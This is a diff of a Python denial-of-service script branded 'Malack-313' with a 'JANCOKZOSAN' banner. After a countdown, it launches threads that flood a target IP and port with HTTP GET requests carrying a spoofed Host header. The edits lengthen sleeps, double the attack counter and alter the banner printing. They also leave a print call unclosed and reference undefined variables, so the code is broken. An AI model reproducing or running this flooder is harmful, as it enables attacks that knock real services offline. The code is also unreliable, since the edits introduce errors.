@@ -1,9 +1,8 @@
-#!/usr/bin/python3
+#!/usr/bin/python3.12
 import os
 import socket
 import threading
 import time
-import fade
 from colorama import Fore, Style
 def ddos():
     os.system("clear")
@@ -35,11 +34,11 @@ def ddos():
     time.sleep(4)
     print(Fore.MAGENTA + Style.BRIGHT + "DDos starting in ~")
     print("\033[0;33mseconds : 3\033[0m")
-    time.sleep(1)
+    time.sleep(2)
     print("\033[1;36mseconds : 2\033[0m")
-    time.sleep(1)
+    time.sleep(2)
     print("seconds : 1")
-    time.sleep(1)
+    time.sleep(2)
 
     def attack():
         nonlocal attack_num
@@ -50,8 +49,8 @@ def ddos():
                 s.sendto(("GET /" + trget + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
-                attack_num += 1
-                print("[💢]  \033[0;36mMalack-313 \033[0;31m▒\033[1;37m▒ \033[1;33mGET \033[1;37mattack \033[1;34m=> \033[1;35m▒ \033[0m"+ str(attack_num))
+                attack_num += 2
+                print("[💢]  \033[0;36mMalack-313 \033[0;31m▒\033[1;37m▒ \033[1;33mGET \033[1;37mattack \033[1;34m=> \033[1;35m▒ \033[0m"+ str(ip)
             except socket.error:
                 print("[💥]\033[1;35m Finnaly attack \033[0;31m Check ip in check host \033[0m")
                 break
@@ -62,7 +61,7 @@ def ddos():
         thread.start()
 def print_red_centered_art():
     os.system("clear")
-    art = '''
+    print("""
 ══════════════════════════════════════════════════════════════════
                                                                   
   ╔═══╗ ╔═══╗ ╔═══════╗ ╔═╗       ╔═══════╗  ╔══════╗ ╔═╗ ╔═══╗   
@@ -78,7 +77,7 @@ def print_red_centered_art():
 \033[92m   ╚══╝  ════╝ ╝   ╚ ╚══╝ ╝   ╚    ╝   ╚ ╝   ╚ ╝     ╚    ╚  \033[0m
 
 \033[33m══════════════════════ \033[37mJ A N C O K Z O S A N\033[33m ═════════════════════
-'''
+""")
     red_art = f"{Fore.GREEN}{art}{Style.RESET_ALL}"  # Set the text color to red
     print(red_art.center(80))  # Adjust the width (80 characters) to match your terminal size
     #red_art2 = f"{Fore.RED}{art2}{Style.RESET_ALL}"
